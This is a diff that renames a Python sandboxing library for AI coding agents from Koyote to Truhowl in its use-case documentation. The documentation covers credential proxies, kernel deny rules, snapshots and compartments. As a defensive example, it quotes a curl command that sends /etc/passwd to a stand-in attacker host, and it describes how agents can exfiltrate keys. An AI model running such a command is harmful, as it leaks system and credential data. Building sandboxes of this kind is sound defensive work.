@@ -1,4 +1,4 @@
-# Koyote : Use Cases & Working Examples
+# Truhowl : Use Cases & Working Examples
 
 Every snippet below was executed against the built wheel on macOS (Seatbelt
 kernel sandbox). The sandbox layer is exercised in an isolated subprocess
@@ -8,7 +8,7 @@ same way the test suite does.
 
 Quick reference : this is the state of the art these examples replace:
 
-| What people run today | Its gap | Koyote |
+| What people run today | Its gap | Truhowl |
 | :--- | :--- | :--- |
 | Agents on the bare host, `--dangerously-skip-permissions` | Agent has your SSH keys, cloud creds, browser data, network | `SandboxRunner` deny-by-default; kernel blocks `~/.ssh`, `~/.aws` |
 | Git worktrees | Protects the *branch*, not credentials or network | Kernel denies the file/network read regardless of branch |
@@ -25,14 +25,14 @@ reads `~/.ssh`, `~/.aws`, keychains, and `.env`; it can shell out to
 `curl`/`python`/`node` which all inherit that access; its API key is in an env
 var the agent can see and exfiltrate.
 
-**Koyote:** the agent runs in one compartment with a credential proxy in
+**Truhowl:** the agent runs in one compartment with a credential proxy in
 front of the model API. The kernel denies reads of SSH keys, cloud configs,
 browser data, and git credentials; the network is localhost-only unless granted;
 and the raw API key is injected at the proxy : the agent never holds it.
 
 ```python
-from koyote.hooks import SandboxRunner
-from koyote.sandbox.proxy import RouteConfig
+from truhowl.hooks import SandboxRunner
+from truhowl.sandbox.proxy import RouteConfig
 
 runner = SandboxRunner(
     workdir=".",                       # the repo the agent may touch
@@ -71,14 +71,14 @@ fire a Docker container. `exec()` is bypassable (any `os.system`, any C
 extension); Docker is cold (image pull dominates startup) and unavailable to
 `exec` subprocesses.
 
-**Koyote:** the REPL tool writes the snippet to an isolated temp file and runs
+**Truhowl:** the REPL tool writes the snippet to an isolated temp file and runs
 it in its own compartment. `fs_read`/`fs_write`/`fs_exec` are granted, `network`
 is denied, so code that generates `os.system("curl …attacker…/$(cat /etc/passwd)")`
 is denied at the kernel for the file read **and** the network call, even
 through a subprocess.
 
 ```python
-from koyote.hooks import SandboxRunner
+from truhowl.hooks import SandboxRunner
 
 runner = SandboxRunner(workdir=".", sandbox=False, block_network=True)  # sandbox=True in prod
 res = runner.run_code(
@@ -104,11 +104,11 @@ prompt-injected agent prompts can read and ship out : the 2026 supply-chain
 attacks (a malicious dependency hiding instructions in a project) turn that into
 a real pre-vector.
 
-**Koyote:** the agent never sees the key. `RouteConfig` rewrites the proxyed
+**Truhowl:** the agent never sees the key. `RouteConfig` rewrites the proxyed
 request path and injects `Authorization` from the env at the proxy:
 
 ```python
-from koyote.sandbox.proxy import RouteConfig, CredentialProxy
+from truhowl.sandbox.proxy import RouteConfig, CredentialProxy
 
 rc = RouteConfig(
     prefix="/v1",
@@ -142,15 +142,15 @@ hop-by-hop headers stripped, absolute-form and origin-form both handled. Verifie
 (Deleting files, moving dirs, and writing binary test fixtures are the usual
 pain.)
 
-**Koyote:** snapshots record a BLAKE3 content-addressed manifest of the
+**Truhowl:** snapshots record a BLAKE3 content-addressed manifest of the
 worktree (skipping `.git`, `node_modules`, `target`, venvs, etc.) and `restore()`
 copies **only the files whose hash changed** : so deleted files come back and
 untouched files stay. Audit: `diffs` returns added/modified/deleted paths per run.
 
 ```python
-from koyote.sandbox.snapshot import SnapshotManager
+from truhowl.sandbox.snapshot import SnapshotManager
 
-snap = SnapshotManager(workdir="/path/project", snapshot_dir="/tmp/.koyote/snaps")
+snap = SnapshotManager(workdir="/path/project", snapshot_dir="/tmp/.truhowl/snaps")
 count = snap.snapshot()                     # index every file (blake3)
 
 # ... agent run mutates file_a.txt and creates new_file.txt ...
@@ -170,18 +170,18 @@ deleted file is restored from the index.
 **Today:** an orchestrator that fans a task into a dozen sub-agents spins up a
 microVM or container per sub-task : boot per sandbox plus per-VM cost.
 
-**Koyote:** compartments are in-process kernel rules; each `Koyote` gets its
+**Truhowl:** compartments are in-process kernel rules; each `Truhowl` gets its
 own policy. Registration order runs; `edge()` wires message paths between
 compartments. No boot, no daemon, ~0 incremental cost.
 
 ```python
-from koyote import Koyote
-from koyote.compartments import Compartment, CompartmentConfig
+from truhowl import Truhowl
+from truhowl.compartments import Compartment, CompartmentConfig
 
-koyote = Koyote(workdir=".")
+truhowl = Truhowl(workdir=".")
 
 for i in range(8):
-    koyote.add(Compartment(
+    truhowl.add(Compartment(
         name=f"task_{i}",
         fn=lambda ctx, i=i: {"result": i * 10},
         config=CompartmentConfig(
@@ -190,14 +190,14 @@ for i in range(8):
         ),
     ))
 
-koyote.edge("task_0", "task_1")               # directed message path
-result = koyote.run()                         # status, compartment outputs, elapsed
+truhowl.edge("task_0", "task_1")               # directed message path
+result = truhowl.run()                         # status, compartment outputs, elapsed
 print(result.status, [k for k in result.output])
 ```
 
-The `AgentKoyote` variant auto-enables insulation (credential proxy,
-snapshots, compression) via `KoyoteConfig(auto_modules=True)`; `Koyote`
+The `AgentTruhowl` variant auto-enables insulation (credential proxy,
+snapshots, compression) via `TruhowlConfig(auto_modules=True)`; `Truhowl`
 stays empty-by-default and everything here is opt-in.
 
-All examples above run against `koyote==1.1.3` as installed from PyPI / wheel
+All examples above run against `truhowl==1.1.3` as installed from PyPI / wheel
 (including the Rust `_core`).
